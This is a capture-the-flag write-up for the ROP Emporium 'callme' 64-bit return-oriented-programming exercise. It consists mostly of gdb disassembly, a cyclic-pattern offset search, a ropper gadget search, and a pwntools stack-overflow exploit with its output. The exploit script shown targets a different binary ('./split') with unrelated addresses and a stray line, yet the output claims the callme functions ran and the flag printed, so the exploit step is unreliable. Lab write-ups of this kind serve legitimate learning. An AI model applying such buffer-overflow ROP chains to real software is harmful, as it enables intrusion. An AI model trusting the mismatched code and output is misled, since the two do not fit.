# callme  64 bit

---

[Accesss the challenge](https://ropemporium.com/challenge/callme.html)

here's some important information....

You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)


---

So we got these files in this challenge:

```bash
❯ ls
 callme   encrypted_flag.dat   key1.dat   key2.dat   libcallme.so  
╭─ ~/rop/callme
╰─❯
```

---

Let's analyze the binary in gdb.............
```bash
❯ sudo gdb callme
[sudo] password for lynk:
GNU gdb (GDB) 14.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 160 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
Reading symbols from callme...
(No debugging symbols found in callme)
------- tip of the day (disable with set show-tips off) -------
GDB and Pwndbg parameters can be shown or set with show <param> and set <param> <value> GDB commands
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004006a8  _init
0x00000000004006d0  puts@plt
0x00000000004006e0  printf@plt
0x00000000004006f0  callme_three@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  callme_one@plt
0x0000000000400730  setvbuf@plt
0x0000000000400740  callme_two@plt
0x0000000000400750  exit@plt
0x0000000000400760  _start
0x0000000000400790  _dl_relocate_static_pie
0x00000000004007a0  deregister_tm_clones
0x00000000004007d0  register_tm_clones
0x0000000000400810  __do_global_dtors_aux
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x0000000000400898  pwnme
0x00000000004008f2  usefulFunction
0x000000000040093c  usefulGadgets
0x0000000000400940  __libc_csu_init
0x00000000004009b0  __libc_csu_fini
0x00000000004009b4  _fini
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000400847 <+0>:	push   rbp
   0x0000000000400848 <+1>:	mov    rbp,rsp
   0x000000000040084b <+4>:	mov    rax,QWORD PTR [rip+0x20081e]        # 0x601070 <stdout@@GLIBC_2.2.5>
   0x0000000000400852 <+11>:	mov    ecx,0x0
   0x0000000000400857 <+16>:	mov    edx,0x2
   0x000000000040085c <+21>:	mov    esi,0x0
   0x0000000000400861 <+26>:	mov    rdi,rax
   0x0000000000400864 <+29>:	call   0x400730 <setvbuf@plt>
   0x0000000000400869 <+34>:	mov    edi,0x4009c8
   0x000000000040086e <+39>:	call   0x4006d0 <puts@plt>
   0x0000000000400873 <+44>:	mov    edi,0x4009df
   0x0000000000400878 <+49>:	call   0x4006d0 <puts@plt>
   0x000000000040087d <+54>:	mov    eax,0x0
   0x0000000000400882 <+59>:	call   0x400898 <pwnme>
   0x0000000000400887 <+64>:	mov    edi,0x4009e7
   0x000000000040088c <+69>:	call   0x4006d0 <puts@plt>
   0x0000000000400891 <+74>:	mov    eax,0x0
   0x0000000000400896 <+79>:	pop    rbp
   0x0000000000400897 <+80>:	ret
End of assembler dump.
pwndbg> disass pwnme
Dump of assembler code for function pwnme:
   0x0000000000400898 <+0>:	push   rbp
   0x0000000000400899 <+1>:	mov    rbp,rsp
   0x000000000040089c <+4>:	sub    rsp,0x20
   0x00000000004008a0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004008a4 <+12>:	mov    edx,0x20
   0x00000000004008a9 <+17>:	mov    esi,0x0
   0x00000000004008ae <+22>:	mov    rdi,rax
   0x00000000004008b1 <+25>:	call   0x400700 <memset@plt>
   0x00000000004008b6 <+30>:	mov    edi,0x4009f0
   0x00000000004008bb <+35>:	call   0x4006d0 <puts@plt>
   0x00000000004008c0 <+40>:	mov    edi,0x400a13
   0x00000000004008c5 <+45>:	mov    eax,0x0
   0x00000000004008ca <+50>:	call   0x4006e0 <printf@plt>
   0x00000000004008cf <+55>:	lea    rax,[rbp-0x20]
   0x00000000004008d3 <+59>:	mov    edx,0x200
   0x00000000004008d8 <+64>:	mov    rsi,rax
   0x00000000004008db <+67>:	mov    edi,0x0
   0x00000000004008e0 <+72>:	call   0x400710 <read@plt>
   0x00000000004008e5 <+77>:	mov    edi,0x400a16
   0x00000000004008ea <+82>:	call   0x4006d0 <puts@plt>
   0x00000000004008ef <+87>:	nop
   0x00000000004008f0 <+88>:	leave
   0x00000000004008f1 <+89>:	ret
End of assembler dump.
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x00000000004008f2 <+0>:	push   rbp
   0x00000000004008f3 <+1>:	mov    rbp,rsp
   0x00000000004008f6 <+4>:	mov    edx,0x6
   0x00000000004008fb <+9>:	mov    esi,0x5
   0x0000000000400900 <+14>:	mov    edi,0x4
   0x0000000000400905 <+19>:	call   0x4006f0 <callme_three@plt>
   0x000000000040090a <+24>:	mov    edx,0x6
   0x000000000040090f <+29>:	mov    esi,0x5
   0x0000000000400914 <+34>:	mov    edi,0x4
   0x0000000000400919 <+39>:	call   0x400740 <callme_two@plt>
   0x000000000040091e <+44>:	mov    edx,0x6
   0x0000000000400923 <+49>:	mov    esi,0x5
   0x0000000000400928 <+54>:	mov    edi,0x4
   0x000000000040092d <+59>:	call   0x400720 <callme_one@plt>
   0x0000000000400932 <+64>:	mov    edi,0x1
   0x0000000000400937 <+69>:	call   0x400750 <exit@plt>
End of assembler dump.
pwndbg> disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x000000000040093c <+0>:	pop    rdi
   0x000000000040093d <+1>:	pop    rsi
   0x000000000040093e <+2>:	pop    rdx
   0x000000000040093f <+3>:	ret
End of assembler dump.
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/lynk/rop/callme/callme
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
callme by ROP Emporium
x86_64

Hope you read the instructions...

> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x00000000004008f1 in pwnme ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0xb
 RBX  0x7fffffffe238 —▸ 0x7fffffffe4ff ◂— '/home/lynk/rop/callme/callme'
 RCX  0x7ffff7eb5504 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7ffff7f90710 ◂— 0
 RSI  0x7ffff7f8f643 (_IO_2_1_stdout_+131) ◂— 0xf90710000000000a /* '\n' */
 R8   0
 R9   0x7ffff7fcdf40 ◂— endbr64
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0
 RBP  0x6161616161616165 ('eaaaaaaa')
 RSP  0x7fffffffe108 ◂— 0x6161616161616166 ('faaaaaaa')
 RIP  0x4008f1 (pwnme+89) ◂— ret
───────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x4008f1 <pwnme+89>    ret                                <0x6161616161616166>
    ↓









─────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe108 ◂— 0x6161616161616166 ('faaaaaaa')
01:0008│     0x7fffffffe110 ◂— 0x6161616161616167 ('gaaaaaaa')
02:0010│     0x7fffffffe118 ◂— 0x6161616161616168 ('haaaaaaa')
03:0018│     0x7fffffffe120 ◂— 0x6161616161616169 ('iaaaaaaa')
04:0020│     0x7fffffffe128 ◂— 0x616161616161616a ('jaaaaaaa')
05:0028│     0x7fffffffe130 ◂— 0x616161616161616b ('kaaaaaaa')
06:0030│     0x7fffffffe138 ◂— 0x616161616161616c ('laaaaaaa')
07:0038│     0x7fffffffe140 ◂— 0x7f0a6161616d
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────
 ► 0         0x4008f1 pwnme+89
   1 0x6161616161616166
   2 0x6161616161616167
   3 0x6161616161616168
   4 0x6161616161616169
   5 0x616161616161616a
   6 0x616161616161616b
   7 0x616161616161616c
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
pwndbg>
```

----

open libcallme.so in gdb.....

---

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000000690  _init
0x00000000000006c0  puts@plt
0x00000000000006d0  fclose@plt
0x00000000000006e0  fgetc@plt
0x00000000000006f0  fgets@plt
0x0000000000000700  malloc@plt
0x0000000000000710  fopen@plt
0x0000000000000720  exit@plt
0x0000000000000730  __cxa_finalize@plt
0x0000000000000740  deregister_tm_clones
0x0000000000000780  register_tm_clones
0x00000000000007d0  __do_global_dtors_aux
0x0000000000000810  frame_dummy
0x000000000000081a  callme_one
0x000000000000092b  callme_two
0x0000000000000a2d  callme_three
0x0000000000000b98  _fini
pwndbg> disass callme_one
Dump of assembler code for function callme_one:
   0x000000000000081a <+0>:	push   rbp
   0x000000000000081b <+1>:	mov    rbp,rsp
   0x000000000000081e <+4>:	sub    rsp,0x30
   0x0000000000000822 <+8>:	mov    QWORD PTR [rbp-0x18],rdi
   0x0000000000000826 <+12>:	mov    QWORD PTR [rbp-0x20],rsi
   0x000000000000082a <+16>:	mov    QWORD PTR [rbp-0x28],rdx
   0x000000000000082e <+20>:	movabs rax,0xdeadbeefdeadbeef
   0x0000000000000838 <+30>:	cmp    QWORD PTR [rbp-0x18],rax
   0x000000000000083c <+34>:	jne    0x912 <callme_one+248>
   0x0000000000000842 <+40>:	movabs rax,0xcafebabecafebabe
   0x000000000000084c <+50>:	cmp    QWORD PTR [rbp-0x20],rax
   0x0000000000000850 <+54>:	jne    0x912 <callme_one+248>
   0x0000000000000856 <+60>:	movabs rax,0xd00df00dd00df00d
   0x0000000000000860 <+70>:	cmp    QWORD PTR [rbp-0x28],rax
   0x0000000000000864 <+74>:	jne    0x912 <callme_one+248>
   0x000000000000086a <+80>:	mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000000872 <+88>:	lea    rsi,[rip+0x32f]        # 0xba8
   0x0000000000000879 <+95>:	lea    rdi,[rip+0x32a]        # 0xbaa
   0x0000000000000880 <+102>:	call   0x710 <fopen@plt>
   0x0000000000000885 <+107>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000000889 <+111>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000000088e <+116>:	jne    0x8a6 <callme_one+140>
   0x0000000000000890 <+118>:	lea    rdi,[rip+0x329]        # 0xbc0
   0x0000000000000897 <+125>:	call   0x6c0 <puts@plt>
   0x000000000000089c <+130>:	mov    edi,0x1
   0x00000000000008a1 <+135>:	call   0x720 <exit@plt>
   0x00000000000008a6 <+140>:	mov    edi,0x21
   0x00000000000008ab <+145>:	call   0x700 <malloc@plt>
   0x00000000000008b0 <+150>:	mov    QWORD PTR [rip+0x2007a9],rax        # 0x201060 <g_buf>
   0x00000000000008b7 <+157>:	mov    rax,QWORD PTR [rip+0x2007a2]        # 0x201060 <g_buf>
   0x00000000000008be <+164>:	test   rax,rax
   0x00000000000008c1 <+167>:	jne    0x8d9 <callme_one+191>
   0x00000000000008c3 <+169>:	lea    rdi,[rip+0x318]        # 0xbe2
   0x00000000000008ca <+176>:	call   0x6c0 <puts@plt>
   0x00000000000008cf <+181>:	mov    edi,0x1
   0x00000000000008d4 <+186>:	call   0x720 <exit@plt>
   0x00000000000008d9 <+191>:	mov    rax,QWORD PTR [rip+0x200780]        # 0x201060 <g_buf>
   0x00000000000008e0 <+198>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000000008e4 <+202>:	mov    esi,0x21
   0x00000000000008e9 <+207>:	mov    rdi,rax
   0x00000000000008ec <+210>:	call   0x6f0 <fgets@plt>
   0x00000000000008f1 <+215>:	mov    QWORD PTR [rip+0x200768],rax        # 0x201060 <g_buf>
   0x00000000000008f8 <+222>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000008fc <+226>:	mov    rdi,rax
   0x00000000000008ff <+229>:	call   0x6d0 <fclose@plt>
   0x0000000000000904 <+234>:	lea    rdi,[rip+0x2f1]        # 0xbfc
   0x000000000000090b <+241>:	call   0x6c0 <puts@plt>
   0x0000000000000910 <+246>:	jmp    0x928 <callme_one+270>
   0x0000000000000912 <+248>:	lea    rdi,[rip+0x301]        # 0xc1a
   0x0000000000000919 <+255>:	call   0x6c0 <puts@plt>
   0x000000000000091e <+260>:	mov    edi,0x1
   0x0000000000000923 <+265>:	call   0x720 <exit@plt>
   0x0000000000000928 <+270>:	nop
   0x0000000000000929 <+271>:	leave
   0x000000000000092a <+272>:	ret
End of assembler dump.
pwndbg> disass callme_two
Dump of assembler code for function callme_two:
   0x000000000000092b <+0>:	push   rbp
   0x000000000000092c <+1>:	mov    rbp,rsp
   0x000000000000092f <+4>:	sub    rsp,0x30
   0x0000000000000933 <+8>:	mov    QWORD PTR [rbp-0x18],rdi
   0x0000000000000937 <+12>:	mov    QWORD PTR [rbp-0x20],rsi
   0x000000000000093b <+16>:	mov    QWORD PTR [rbp-0x28],rdx
   0x000000000000093f <+20>:	movabs rax,0xdeadbeefdeadbeef
   0x0000000000000949 <+30>:	cmp    QWORD PTR [rbp-0x18],rax
   0x000000000000094d <+34>:	jne    0xa14 <callme_two+233>
   0x0000000000000953 <+40>:	movabs rax,0xcafebabecafebabe
   0x000000000000095d <+50>:	cmp    QWORD PTR [rbp-0x20],rax
   0x0000000000000961 <+54>:	jne    0xa14 <callme_two+233>
   0x0000000000000967 <+60>:	movabs rax,0xd00df00dd00df00d
   0x0000000000000971 <+70>:	cmp    QWORD PTR [rbp-0x28],rax
   0x0000000000000975 <+74>:	jne    0xa14 <callme_two+233>
   0x000000000000097b <+80>:	mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000000983 <+88>:	lea    rsi,[rip+0x21e]        # 0xba8
   0x000000000000098a <+95>:	lea    rdi,[rip+0x29e]        # 0xc2f
   0x0000000000000991 <+102>:	call   0x710 <fopen@plt>
   0x0000000000000996 <+107>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000000099a <+111>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000000099f <+116>:	jne    0x9b7 <callme_two+140>
   0x00000000000009a1 <+118>:	lea    rdi,[rip+0x290]        # 0xc38
   0x00000000000009a8 <+125>:	call   0x6c0 <puts@plt>
   0x00000000000009ad <+130>:	mov    edi,0x1
   0x00000000000009b2 <+135>:	call   0x720 <exit@plt>
   0x00000000000009b7 <+140>:	mov    DWORD PTR [rbp-0xc],0x0
   0x00000000000009be <+147>:	mov    DWORD PTR [rbp-0xc],0x0
   0x00000000000009c5 <+154>:	jmp    0xa00 <callme_two+213>
   0x00000000000009c7 <+156>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000009cb <+160>:	mov    rdi,rax
   0x00000000000009ce <+163>:	call   0x6e0 <fgetc@plt>
   0x00000000000009d3 <+168>:	mov    esi,eax
   0x00000000000009d5 <+170>:	mov    rdx,QWORD PTR [rip+0x200684]        # 0x201060 <g_buf>
   0x00000000000009dc <+177>:	mov    eax,DWORD PTR [rbp-0xc]
   0x00000000000009df <+180>:	cdqe
   0x00000000000009e1 <+182>:	add    rax,rdx
   0x00000000000009e4 <+185>:	movzx  ecx,BYTE PTR [rax]
   0x00000000000009e7 <+188>:	mov    rdx,QWORD PTR [rip+0x200672]        # 0x201060 <g_buf>
   0x00000000000009ee <+195>:	mov    eax,DWORD PTR [rbp-0xc]
   0x00000000000009f1 <+198>:	cdqe
   0x00000000000009f3 <+200>:	add    rax,rdx
   0x00000000000009f6 <+203>:	xor    ecx,esi
   0x00000000000009f8 <+205>:	mov    edx,ecx
   0x00000000000009fa <+207>:	mov    BYTE PTR [rax],dl
   0x00000000000009fc <+209>:	add    DWORD PTR [rbp-0xc],0x1
   0x0000000000000a00 <+213>:	cmp    DWORD PTR [rbp-0xc],0xf
   0x0000000000000a04 <+217>:	jle    0x9c7 <callme_two+156>
   0x0000000000000a06 <+219>:	lea    rdi,[rip+0x243]        # 0xc50
   0x0000000000000a0d <+226>:	call   0x6c0 <puts@plt>
   0x0000000000000a12 <+231>:	jmp    0xa2a <callme_two+255>
   0x0000000000000a14 <+233>:	lea    rdi,[rip+0x1ff]        # 0xc1a
   0x0000000000000a1b <+240>:	call   0x6c0 <puts@plt>
   0x0000000000000a20 <+245>:	mov    edi,0x1
   0x0000000000000a25 <+250>:	call   0x720 <exit@plt>
   0x0000000000000a2a <+255>:	nop
   0x0000000000000a2b <+256>:	leave
   0x0000000000000a2c <+257>:	ret
End of assembler dump.
pwndbg> disass callme_three
Dump of assembler code for function callme_three:
   0x0000000000000a2d <+0>:	push   rbp
   0x0000000000000a2e <+1>:	mov    rbp,rsp
   0x0000000000000a31 <+4>:	sub    rsp,0x30
   0x0000000000000a35 <+8>:	mov    QWORD PTR [rbp-0x18],rdi
   0x0000000000000a39 <+12>:	mov    QWORD PTR [rbp-0x20],rsi
   0x0000000000000a3d <+16>:	mov    QWORD PTR [rbp-0x28],rdx
   0x0000000000000a41 <+20>:	movabs rax,0xdeadbeefdeadbeef
   0x0000000000000a4b <+30>:	cmp    QWORD PTR [rbp-0x18],rax
   0x0000000000000a4f <+34>:	jne    0xb81 <callme_three+340>
   0x0000000000000a55 <+40>:	movabs rax,0xcafebabecafebabe
   0x0000000000000a5f <+50>:	cmp    QWORD PTR [rbp-0x20],rax
   0x0000000000000a63 <+54>:	jne    0xb81 <callme_three+340>
   0x0000000000000a69 <+60>:	movabs rax,0xd00df00dd00df00d
   0x0000000000000a73 <+70>:	cmp    QWORD PTR [rbp-0x28],rax
   0x0000000000000a77 <+74>:	jne    0xb81 <callme_three+340>
   0x0000000000000a7d <+80>:	mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000000a85 <+88>:	lea    rsi,[rip+0x11c]        # 0xba8
   0x0000000000000a8c <+95>:	lea    rdi,[rip+0x1db]        # 0xc6e
   0x0000000000000a93 <+102>:	call   0x710 <fopen@plt>
   0x0000000000000a98 <+107>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000000a9c <+111>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000000aa1 <+116>:	jne    0xab9 <callme_three+140>
   0x0000000000000aa3 <+118>:	lea    rdi,[rip+0x1cd]        # 0xc77
   0x0000000000000aaa <+125>:	call   0x6c0 <puts@plt>
   0x0000000000000aaf <+130>:	mov    edi,0x1
   0x0000000000000ab4 <+135>:	call   0x720 <exit@plt>
   0x0000000000000ab9 <+140>:	mov    DWORD PTR [rbp-0xc],0x10
   0x0000000000000ac0 <+147>:	mov    DWORD PTR [rbp-0xc],0x10
   0x0000000000000ac7 <+154>:	jmp    0xb02 <callme_three+213>
   0x0000000000000ac9 <+156>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000000acd <+160>:	mov    rdi,rax
   0x0000000000000ad0 <+163>:	call   0x6e0 <fgetc@plt>
   0x0000000000000ad5 <+168>:	mov    esi,eax
   0x0000000000000ad7 <+170>:	mov    rdx,QWORD PTR [rip+0x200582]        # 0x201060 <g_buf>
   0x0000000000000ade <+177>:	mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000000ae1 <+180>:	cdqe
   0x0000000000000ae3 <+182>:	add    rax,rdx
   0x0000000000000ae6 <+185>:	movzx  ecx,BYTE PTR [rax]
   0x0000000000000ae9 <+188>:	mov    rdx,QWORD PTR [rip+0x200570]        # 0x201060 <g_buf>
   0x0000000000000af0 <+195>:	mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000000af3 <+198>:	cdqe
   0x0000000000000af5 <+200>:	add    rax,rdx
   0x0000000000000af8 <+203>:	xor    ecx,esi
   0x0000000000000afa <+205>:	mov    edx,ecx
   0x0000000000000afc <+207>:	mov    BYTE PTR [rax],dl
   0x0000000000000afe <+209>:	add    DWORD PTR [rbp-0xc],0x1
   0x0000000000000b02 <+213>:	cmp    DWORD PTR [rbp-0xc],0x1f
   0x0000000000000b06 <+217>:	jle    0xac9 <callme_three+156>
   0x0000000000000b08 <+219>:	mov    rax,QWORD PTR [rip+0x200551]        # 0x201060 <g_buf>
   0x0000000000000b0f <+226>:	add    rax,0x4
   0x0000000000000b13 <+230>:	mov    rax,QWORD PTR [rax]
   0x0000000000000b16 <+233>:	mov    rdx,QWORD PTR [rip+0x200543]        # 0x201060 <g_buf>
   0x0000000000000b1d <+240>:	add    rdx,0x4
   0x0000000000000b21 <+244>:	xor    rax,QWORD PTR [rbp-0x18]
   0x0000000000000b25 <+248>:	mov    QWORD PTR [rdx],rax
   0x0000000000000b28 <+251>:	mov    rax,QWORD PTR [rip+0x200531]        # 0x201060 <g_buf>
   0x0000000000000b2f <+258>:	add    rax,0xc
   0x0000000000000b33 <+262>:	mov    rax,QWORD PTR [rax]
   0x0000000000000b36 <+265>:	mov    rdx,QWORD PTR [rip+0x200523]        # 0x201060 <g_buf>
   0x0000000000000b3d <+272>:	add    rdx,0xc
   0x0000000000000b41 <+276>:	xor    rax,QWORD PTR [rbp-0x20]
   0x0000000000000b45 <+280>:	mov    QWORD PTR [rdx],rax
   0x0000000000000b48 <+283>:	mov    rax,QWORD PTR [rip+0x200511]        # 0x201060 <g_buf>
   0x0000000000000b4f <+290>:	add    rax,0x14
   0x0000000000000b53 <+294>:	mov    rax,QWORD PTR [rax]
   0x0000000000000b56 <+297>:	mov    rdx,QWORD PTR [rip+0x200503]        # 0x201060 <g_buf>
   0x0000000000000b5d <+304>:	add    rdx,0x14
   0x0000000000000b61 <+308>:	xor    rax,QWORD PTR [rbp-0x28]
   0x0000000000000b65 <+312>:	mov    QWORD PTR [rdx],rax
   0x0000000000000b68 <+315>:	mov    rax,QWORD PTR [rip+0x2004f1]        # 0x201060 <g_buf>
   0x0000000000000b6f <+322>:	mov    rdi,rax
   0x0000000000000b72 <+325>:	call   0x6c0 <puts@plt>
   0x0000000000000b77 <+330>:	mov    edi,0x0
   0x0000000000000b7c <+335>:	call   0x720 <exit@plt>
   0x0000000000000b81 <+340>:	lea    rdi,[rip+0x92]        # 0xc1a
   0x0000000000000b88 <+347>:	call   0x6c0 <puts@plt>
   0x0000000000000b8d <+352>:	mov    edi,0x1
   0x0000000000000b92 <+357>:	call   0x720 <exit@plt>
End of assembler dump.
pwndbg>
```

---

UserfulGadgets

```bash
❯ ropper -f callme --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: callme
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;
0x00000000004009a3: pop rdi; ret;
```

---

offset = 40

---

Now let's craft our exploit...........

---

```python
from pwn import *

context.binary = binary = "./split"
							
# payload = b'A' * 40 + pop_rdi + p64(0x00000000004007c3) + "/bin/cat flag.txt" + p64(0x00601060) + Any address of pwnme - p64(0x0000000000400741) + system - p64(0x0000000000400560)
payload = b'A' * 40 + p64(0x00000000004007c3) + p64(0x601060) + p64(0x0000000000400741) + p64(0x0000000000400560)
0x601060


p = process()

p.sendlineafter(b'>', payload)

p.interactive()
```

----

Executing this exploit.................

```bash
❯ python3 exp.py
[*] '/home/lynk/rop/callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/lynk/rop/callme/callme': pid 24471
[*] Switching to interactive mode
 [*] Process '/home/lynk/rop/callme/callme' stopped with exit code 0 (pid 24471)
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive

```
---
